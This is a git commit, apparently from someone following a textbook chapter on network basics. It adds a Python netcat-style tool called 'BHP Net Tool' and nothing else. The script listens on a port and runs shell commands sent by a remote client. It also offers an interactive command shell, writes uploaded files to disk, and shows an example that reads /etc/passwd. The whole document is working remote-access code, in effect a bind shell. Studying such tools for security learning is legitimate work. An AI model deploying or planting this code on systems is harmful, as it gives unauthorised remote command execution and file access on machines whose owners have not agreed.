e2728977d8cddbb981122aaaf78b4bc5c29df954
MLCCS <554691952@qq.com>
2019-04-18 15:32:37 +0800

    就是这个吧，大概

---
+++ 第2章-网络基础/nc.py
@@ -0,0 +1,155 @@
+import sys
+import socket 
+import getopt
+import threading
+import subprocess
+from chardet import detect
+
+
+listen = False
+command = False
+upload = False
+execute = ""
+target = ""
+upload_destination = ""
+port = ""
+
+def run_command(command):
+    command = command.rstrip()
+    try:
+        command = bytes.decode(command)
+        print (command)
+        output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True )
+    except Exception as b:
+        print (b)
+        output = "Failed to execute command. \r\n"
+    return output
+def client_handler(client_socket):
+    global upload
+    global execute
+    global command
+    if len(upload_destination):
+        file_buffer = ""
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+            else:
+                file_buffer += data
+        try:
+            file_descriptor = open(upload_destination,"wb")
+            file_descriptor.write(file_buffer)
+            file_descriptor.close()
+            client_socket.send(str.encode("Successfully saved file to %s\r\n" % upload_destination))
+        except:
+            client_socket.send(str.encode("Failed to save file to %s\r\n" % upload_destination))
+    if len(execute):
+        output = run_command(execute)
+        client_socket.send(str.encode(output))
+    if command:
+        while True:
+            client_socket.send(str.encode("<BHP:#>"))
+            cmd_buffer = ""
+            cmd_buffer = str.encode(cmd_buffer)
+            while "\n" not in bytes.decode(cmd_buffer):
+                cmd_buffer += client_socket.recv(4096)
+            response = run_command(cmd_buffer)
+            bytestype = detect(response)
+            if bytestype["encoding"] == "GB2312": #我在这里加了一个字符编码判断当编码为 gbk时 先解码 因为py3 默认是utf-8
+                response = response.decode('gbk')
+                response = str.encode(response)     
+            client_socket.send(response)
+			
+def server_loop():
+    global target
+    if not len(target):
+        target = "0.0.0.0"
+    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.bind((target,port))
+    server.listen(5)
+    while True:
+        client_socket, addr = server.accept()
+        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
+        client_thread.start()
+		
+def client_sender(buffer):
+    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    try:
+        client.connect((target,port))
+        if len(buffer):
+            client.send(str.encode(buffer))
+        while True:
+            recv_len = 1
+            response = ""
+            while recv_len:
+                data = client.recv(4096)
+                recv_len = len(data)
+                data = bytes.decode(data)
+                response += data
+                if recv_len < 4096:
+                    break
+            print (response)
+            buffer = input("")
+            buffer += "\n"
+            client.send(str.encode(buffer))
+    except Exception as e:
+        print (e)
+        print ("[*] Exception! Exiting.")
+        client.close()
+def  usage():
+    print ("BHP Net Tool")
+    print ()
+    print ("Usage:netcat.py -t target_host -p port")
+    print ("-l --listen                 - listen on [host]:[port] for incoming connections")
+    print ("-e --execute=file_to_run    - -execute the given file upon receiving a connection")
+    print ("-c --command                - initialize a commandshell")
+    print ("-u --upload=destination     - upon receiving connection upload a file and write to [destination]")
+    print ()
+    print ()
+    print ("Examples: ") 
+    print ("netcat.py -t 192.168.0.1 -p 5555 -l -c")
+    print ("netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"  )
+    print ("netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd")
+    print ("echo 'ABCDEFGHI' | python ./netcat.py -t 192.168.11.12 -p 135") 
+    sys.exit(0)
+	
+def main():
+    global listen
+    global port
+    global execute
+    global command
+    global upload_destination
+    global target
+
+    if not len(sys.argv[1:]):
+        usage()
+    try:
+        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu",["help","listen","execute","port","command","upload"])
+    except getopt.GetoptError as err:
+        print (str(err))
+        usage()
+    for o,a in opts:
+        if o in ("-h","-help"):
+            usage()
+        elif o in ("-l","--listen"):
+            listen = True
+        elif o in ("-e","--execute"):
+            execute = a
+        elif o in ("-c","--commandshell"):
+            command = True
+        elif o in ("-u","--upload"):
+            upload_destination = a
+        elif o in ("-t","--target"):
+            target = a
+        elif o in ("-p","--port"):
+            port = int(a)
+        else:
+            assert False,"Unhandled Optin"
+    if not listen and len(target) and port > 0:
+            buffer = sys.stdin.read()
+            client_sender(buffer)
+    if listen:
+            server_loop()
+			
+if __name__ == "__main__":
+	main()
